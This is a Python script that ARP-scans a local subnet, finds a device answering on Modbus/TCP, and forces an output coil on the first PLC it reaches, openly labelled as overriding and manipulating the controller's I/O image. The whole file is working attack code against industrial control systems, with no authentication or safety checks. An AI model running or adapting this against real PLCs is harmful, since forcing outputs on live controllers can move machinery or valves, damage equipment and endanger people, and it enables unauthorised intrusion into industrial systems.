from scapy.all import ARP, Ether, srp
from pymodbus.client import ModbusTcpClient
import time

# Function to find valid Modbus/TCP PLCs in the network
def find_plc_ip(network_range="192.168.1.0/24"):
    print("[*] Scanning the network for PLC...")
    
    # Send ARP request to all devices in the specified subnet
    arp_request = ARP(pdst=network_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp_request
    result = srp(packet, timeout=2, verbose=False)[0]

    # Store discovered IPs
    active_ips = [received.psrc for sent, received in result]

    # Identify a device running Modbus/TCP (Port 502)
    for ip in active_ips:
        try:
            client = ModbusTcpClient(ip)
            if client.connect():
                print(f"[+] Found a Modbus/TCP PLC at {ip}")
                return ip  # Return the PLC's IP address
        except:
            pass

    print("[-] No Modbus/TCP PLC found.")
    return None

# Function to override I/O on the PLC
def manipulate_io_image(plc_ip):
    client = ModbusTcpClient(plc_ip)

    if not client.connect():
        print(f"[-] Could not connect to PLC at {plc_ip}. Exiting...")
        return

    print(f"[+] Connected to PLC at {plc_ip}")

    # Modify output coil values (0x0000 for the first coil)
    coil_address = 0  # You may need to set this according to your PLC
    force_value = True  # Force output coil to ON

    print(f"[*] Overriding output coil at address {coil_address}...")
    
    response = client.write_coil(coil_address, force_value)
    
    if response.isError():
        print(f"[-] Failed to manipulate I/O image at {coil_address}.")
    else:
        print(f"[+] Successfully manipulated the I/O image at {coil_address}!")

    client.close()

# Main execution
if __name__ == "__main__":
    plc_ip = find_plc_ip()

    if plc_ip:
        manipulate_io_image(plc_ip)
    else:
        print("[-] No PLC found, cannot manipulate I/O image.")